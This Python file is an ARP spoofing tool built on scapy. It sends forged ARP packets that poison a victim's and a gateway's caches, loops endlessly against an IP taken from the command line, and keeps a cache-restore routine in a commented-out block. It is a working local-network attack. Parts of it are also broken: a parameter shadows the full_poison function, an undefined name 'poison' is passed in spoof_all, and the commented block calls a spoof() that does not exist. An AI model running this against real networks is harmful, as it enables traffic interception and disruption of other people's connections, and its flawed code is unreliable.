from time import sleep
from sys import argv

from scapy.all import send, ARP

from Target import Target
from scan_arp import make_target
from utils import get_gateway

sleep_iter = 3

def partial_poison(Victim):
    op_code = 1
    send(ARP(op = op_code, psrc=Victim.ipv4, hwdst=Victim.mac))
    sleep(sleep_iter)

def full_poison(Victim, Gateway):
    op_code = 2
    send(ARP(op = op_code, pdst = Victim.ipv4, psrc = Gateway.ipv4, hwdst = Victim.mac))
    send(ARP(op = op_code, pdst = Gateway.ipv4, psrc = Victim.ipv4, hwdst = Gateway.mac))
    sleep(sleep_iter)

def restore(Victim, Gateway):
    op_code = 2
    mac_addr = "ff:ff:ff:ff:ff:ff"

    send(ARP(op = op_code, pdst = Gateway.ipv4, psrc = Victim.ipv4, hwdst = mac_addr, hwsrc = Victim.mac), count = 4)
    send(ARP(op = op_code, pdst = Victim.ipv4, psrc = Gateway.ipv4, hwdst = mac_addr, hwsrc = Gateway.mac), count = 4)

def spoof_all(victim_list, full_poison = False):
    if full_poison == True:
        Gateway = make_target(get_gateway())
        while 1:
            for Victim in victim_list:
                full_poison(Victim, Gateway)
    else:
        for Victim in victim_list:
            partial_poison(poison)

    return

if __name__ == '__main__':
    #pass in the ip_address of the target you wish to poison 
    Victim = make_target(argv[1])
    while 1:
        partial_poison(Victim) 

'''
    Gateway = make_target(get_gateway())
    try:
        while 1:
            spoof(Victim, Gateway)
            sleep(1)
    except KeyboardInterrupt:
        restore(Victim, Gateway)
    except Exception as e:
        print(e)
        restore(Victim, Gateway)
'''
